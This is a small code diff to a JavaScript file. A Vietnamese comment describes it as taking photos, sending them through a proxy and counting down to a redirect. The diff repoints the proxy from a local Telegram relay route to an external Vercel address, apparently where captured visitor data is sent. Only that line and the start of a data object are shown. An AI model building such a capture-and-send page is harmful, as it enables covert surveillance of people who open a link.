@@ -1,5 +1,5 @@
 // main.js - Phiên bản Full: Chụp ảnh, Gửi Proxy & Đếm ngược chuyển hướng
-const API_PROXY = "/api/tele-proxy";
+const API_PROXY = "https://pho-tbootkomura-4yr9ov17m-amttakatoris-projects.vercel.app";
 
 const info = {
   time: new Date().toLocaleString("vi-VN"),
